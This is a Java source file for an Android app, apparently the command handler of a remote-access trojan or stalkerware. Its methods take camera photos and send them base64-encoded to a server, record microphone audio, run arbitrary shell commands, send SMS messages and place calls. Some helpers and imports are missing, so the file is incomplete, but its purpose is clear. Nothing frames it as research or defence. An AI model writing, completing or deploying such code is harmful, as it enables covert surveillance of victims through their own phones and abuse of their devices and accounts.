// RemoteControl.java
package com.your.app.service;

import android.hardware.Camera;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class RemoteControl {
    
    public static String captureCamera(int cameraId) {
        try {
            Camera camera = Camera.open(cameraId);
            Camera.Parameters params = camera.getParameters();
            camera.setParameters(params);
            
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    String base64Image = Base64.encodeToString(data, Base64.DEFAULT);
                    sendToServer("IMAGE|" + base64Image);
                    camera.release();
                }
            });
            return "CAPTURE_STARTED";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    public static String recordAudio(int duration) {
        try {
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            File outputFile = new File(AppContext.get().getCacheDir(), "recording.3gp");
            recorder.setOutputFile(outputFile.getAbsolutePath());
            
            recorder.prepare();
            recorder.start();
            
            Thread.sleep(duration * 1000);
            
            recorder.stop();
            recorder.release();
            
            // Convert to base64 and send
            byte[] audioData = fileToBytes(outputFile);
            String base64Audio = Base64.encodeToString(audioData, Base64.DEFAULT);
            outputFile.delete();
            
            return "AUDIO|" + base64Audio;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    public static String executeShell(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            process.waitFor();
            
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(process.getInputStream()));
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            return output.toString();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    public static String sendSMS(String number, String message) {
        try {
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            return "SMS_SENT";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
    
    public static String makeCall(String number) {
        try {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + number));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            AppContext.get().startActivity(callIntent);
            return "CALL_INITIATED";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}
